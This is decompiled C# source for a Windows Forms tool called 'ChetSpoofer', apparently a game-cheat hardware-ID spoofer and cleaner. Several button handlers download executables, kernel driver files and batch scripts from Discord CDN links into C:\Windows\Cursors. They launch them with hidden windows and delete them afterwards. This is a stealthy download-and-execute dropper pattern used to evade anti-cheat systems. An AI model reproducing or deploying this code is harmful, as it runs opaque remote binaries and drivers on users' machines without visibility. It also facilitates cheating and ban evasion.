using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using ChetSpoofer.Properties;
using Guna.UI2.WinForms;
using Siticone.Desktop.UI.WinForms;

namespace ChetSpoofer
{
	// Token: 0x02000005 RID: 5
	public partial class Main : Form
	{
		// Token: 0x06000018 RID: 24 RVA: 0x00003985 File Offset: 0x00001B85
		public Main()
		{
			this.InitializeComponent();
			base.TopMost = true;
		}

		// Token: 0x06000019 RID: 25 RVA: 0x000039A8 File Offset: 0x00001BA8
		private void guna2Button1_Click(object sender, EventArgs e)
		{
			Login login = new Login();
			login.Show();
			base.Hide();
		}

		// Token: 0x0600001A RID: 26 RVA: 0x000039CA File Offset: 0x00001BCA
		private void siticoneShadowPanel4_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x0600001B RID: 27 RVA: 0x000039CD File Offset: 0x00001BCD
		private void button2_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600001C RID: 28 RVA: 0x000039D0 File Offset: 0x00001BD0
		private void guna2Button4_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\Cursors\\Systemmap.exe";
			string text2 = "C:\\Windows\\Cursors\\Systemdriver.sys";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/993175907122552994/1027989964773924884/Systemmap.exe", text);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/993175907122552994/1027989965096890389/Systemdriver.sys", text2);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process = Process.Start(text, text2);
			Thread.Sleep(750);
			File.Delete(text2);
			Thread.Sleep(5000);
			File.Delete(text);
		}

		// Token: 0x0600001D RID: 29 RVA: 0x00003A74 File Offset: 0x00001C74
		private void guna2Button5_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\Cursors\\Fortnite_Cleaner.exe";
			string text2 = "C:\\Windows\\Cursors\\Trinity.bat";
			string text3 = "C:\\Windows\\Cursors\\3.bat";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/969701698291511337/1029446879471226930/Fortnite_Cleaner.exe", text);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process = Process.Start(text);
			Thread.Sleep(500);
			process.WaitForExit();
			File.Delete(text);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/969701698291511337/1029447020265619456/Trinity.bat", text2);
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process = Process.Start(text2);
			Thread.Sleep(500);
			process.WaitForExit();
			File.Delete(text2);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/969701698291511337/1029447225534849035/3.bat", text3);
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process = Process.Start(text3);
			Thread.Sleep(500);
			process.WaitForExit();
			File.Delete(text3);
		}

		// Token: 0x0600001E RID: 30 RVA: 0x00003BE4 File Offset: 0x00001DE4
		private void guna2Button7_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\Cursors\\bat.bat";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/791890918856327178/1029459998083928064/checker.bat", text);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process = Process.Start(text);
			Thread.Sleep(500);
			process.WaitForExit();
			File.Delete(text);
		}

		// Token: 0x0600001F RID: 31 RVA: 0x00003C69 File Offset: 0x00001E69
		private void siticoneShadowPanel2_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000020 RID: 32 RVA: 0x00003C6C File Offset: 0x00001E6C
		private void siticoneShadowPanel3_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000021 RID: 33 RVA: 0x00003C6F File Offset: 0x00001E6F
		private void siticoneShadowPanel1_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000022 RID: 34 RVA: 0x00003C72 File Offset: 0x00001E72
		private void label14_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000023 RID: 35 RVA: 0x00003C78 File Offset: 0x00001E78
		private void guna2Button3_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\Cursors\\SUS.sys";
			string text2 = "C:\\Windows\\Cursors\\SAS.exe";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/1028004149528363018/1029441158834819203/SUS.sys", text);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/1028004149528363018/1029441159229087885/SAS.exe", text2);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process = Process.Start(text2, text);
			Thread.Sleep(750);
			File.Delete(text);
			File.Delete(text2);
		}

		// Token: 0x06000024 RID: 36 RVA: 0x00003D14 File Offset: 0x00001F14
		private void guna2Button6_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\Cursors\\NoxiusFivemCleaner.exe";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/1031899813194780777/1031962809870848031/cursor.exe", text);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process = Process.Start(text);
			Thread.Sleep(750);
			File.Delete(text);
		}

		// Token: 0x06000025 RID: 37 RVA: 0x00003D92 File Offset: 0x00001F92
		private void guna2Button2_Click(object sender, EventArgs e)
		{
			Process.Start("https://discord.gg/eNjUVpM3BB");
		}

		// Token: 0x06000026 RID: 38 RVA: 0x00003DA0 File Offset: 0x00001FA0
		private void label1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000027 RID: 39 RVA: 0x00003DA3 File Offset: 0x00001FA3
		private void label12_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000028 RID: 40 RVA: 0x00003DA6 File Offset: 0x00001FA6
		private void Main_Load(object sender, EventArgs e)
		{
		}

		// Token: 0x06000029 RID: 41 RVA: 0x00003DA9 File Offset: 0x00001FA9
		private void label2_Click(object sender, EventArgs e)
		{
			new Spoofers().Show();
			base.Hide();
		}

		// Token: 0x0600002A RID: 42 RVA: 0x00003DBE File Offset: 0x00001FBE
		private void label4_Click(object sender, EventArgs e)
		{
			new dumper().Show();
			base.Hide();
		}

		// Token: 0x0600002B RID: 43 RVA: 0x00003DD3 File Offset: 0x00001FD3
		private void label3_Click(object sender, EventArgs e)
		{
			new executor().Show();
			base.Hide();
		}
	}
}
